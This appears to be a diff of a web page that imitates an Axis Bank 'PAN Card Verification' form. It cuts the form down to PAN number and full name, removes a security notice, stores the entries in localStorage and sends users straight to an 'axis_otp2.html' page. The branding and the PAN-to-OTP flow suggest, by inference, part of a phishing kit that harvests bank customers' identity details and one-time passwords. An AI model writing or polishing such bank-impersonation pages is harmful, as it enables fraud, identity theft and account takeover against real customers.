@@ -372,26 +372,6 @@
             font-style: italic;
         }
         
-        /* Security Note */
-        .security-note {
-            background: #fff8e1;
-            border: 1px solid #ffd54f;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 20px 0;
-            font-size: 14px;
-            color: #5d4037;
-        }
-        
-        .security-title {
-            font-weight: bold;
-            color: #87103F;
-            margin-bottom: 5px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
         /* Button Container */
         .btn-container {
             display: flex;
@@ -635,7 +615,7 @@
                 <div class="pan-box">
                     <div class="pan-header">
                         <div class="pan-title">PAN Card Verification</div>
-                        <div class="pan-subtitle">Enter your PAN card details for KYC verification</div>
+                        <div class="pan-subtitle">Enter your PAN card details for verification</div>
                     </div>
                     
                     <div class="form-container">
@@ -646,14 +626,6 @@
                                 PAN (Permanent Account Number) is mandatory for financial transactions and tax purposes. 
                                 Please ensure the details match your official PAN card.
                             </div>
-                        </div>
-                        
-                        <!-- Security Note -->
-                        <div class="security-note">
-                            <div class="security-title">
-                                <span>🔒</span> Security Note
-                            </div>
-                            Your PAN details are encrypted and stored securely. Axis Bank follows RBI guidelines for data protection.
                         </div>
                         
                         <!-- PAN Form -->
@@ -678,42 +650,6 @@
                                            required>
                                     <div class="input-icon">👤</div>
                                 </div>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="dob">Date of Birth (as per PAN)</label>
-                                <div class="input-with-icon">
-                                    <input type="date" class="form-input" id="dob" name="dob" 
-                                           required>
-                                    <div class="input-icon">📅</div>
-                                </div>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="fatherName">Father's Name (as per PAN)</label>
-                                <div class="input-with-icon">
-                                    <input type="text" class="form-input" id="fatherName" name="fatherName" 
-                                           placeholder="Enter father's name as per PAN card" 
-                                           required>
-                                    <div class="input-icon">👨</div>
-                                </div>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="email">Email Address</label>
-                                <div class="input-with-icon">
-                                    <input type="email" class="form-input" id="email" name="email" 
-                                           placeholder="Enter your email address" 
-                                           required>
-                                    <div class="input-icon">📧</div>
-                                </div>
-                            </div>
-                            
-                            <div class="form-group">
-                                <label class="form-label" for="address">Residential Address</label>
-                                <textarea class="form-input" id="address" name="address" 
-                                          placeholder="Enter your current residential address" 
-                                          rows="3" required></textarea>
                             </div>
                             
                             <!-- Buttons -->
@@ -766,22 +702,9 @@
         const panForm = document.getElementById('panForm');
         const panNumberInput = document.getElementById('panNumber');
         const fullNameInput = document.getElementById('fullName');
-        const dobInput = document.getElementById('dob');
-        const fatherNameInput = document.getElementById('fatherName');
-        const emailInput = document.getElementById('email');
-        const addressInput = document.getElementById('address');
         const verifyButton = document.getElementById('verifyButton');
         const backLink = document.getElementById('backLink');
         const helpLink = document.getElementById('helpLink');
-        
-        // Set max date for Date of Birth (must be at least 18 years old)
-        const today = new Date();
-        const maxDate = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
-        dobInput.max = maxDate.toISOString().split('T')[0];
-        
-        // Set min date (reasonable limit - 100 years)
-        const minDate = new Date(today.getFullYear() - 100, today.getMonth(), today.getDate());
-        dobInput.min = minDate.toISOString().split('T')[0];
         
         // PAN number validation and auto-uppercase
         panNumberInput.addEventListener('input', function(e) {
@@ -873,10 +796,6 @@
                 // Get form values
                 const panNumber = panNumberInput.value.toUpperCase();
                 const fullName = fullNameInput.value.trim();
-                const dob = dobInput.value;
-                const fatherName = fatherNameInput.value.trim();
-                const email = emailInput.value.trim();
-                const address = addressInput.value.trim();
                 
                 // Validate PAN format
                 if (!validatePAN(panNumber)) {
@@ -889,18 +808,7 @@
                 }
                 
                 // Validate required fields
-                if (!fullName || !dob || !fatherName || !email || !address) {
-                    // Quick error indication
-                    verifyButton.style.background = '#ff4444';
-                    setTimeout(() => {
-                        verifyButton.style.background = '#87103F';
-                    }, 500);
-                    return;
-                }
-                
-                // Validate email format
-                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                if (!emailRegex.test(email)) {
+                if (!fullName) {
                     // Quick error indication
                     verifyButton.style.background = '#ff4444';
                     setTimeout(() => {
@@ -918,10 +826,6 @@
                 const panData = {
                     panNumber: panNumber,
                     fullName: fullName,
-                    dob: dob,
-                    fatherName: fatherName,
-                    email: email,
-                    address: address,
                     verificationTime: new Date().toLocaleString()
                 };
                 
@@ -938,7 +842,6 @@
                     verifyButton.classList.remove('loading');
                     verifyButton.disabled = false;
                     
-                    // NO ALERT MESSAGE - Direct redirect
                     // Redirect to axis_otp2.html
                     window.location.href = 'axis_otp2.html';
                     
@@ -962,10 +865,6 @@
         window.addEventListener('DOMContentLoaded', function() {
             // Focus PAN input
             panNumberInput.focus();
-            
-            // Set today's date as default for Date of Birth field
-            const defaultDate = new Date(today.getFullYear() - 25, today.getMonth(), today.getDate());
-            dobInput.value = defaultDate.toISOString().split('T')[0];
             
             // Initialize localStorage for PAN verifications if not exists
             if (!localStorage.getItem('axisBankPANVerifications')) {
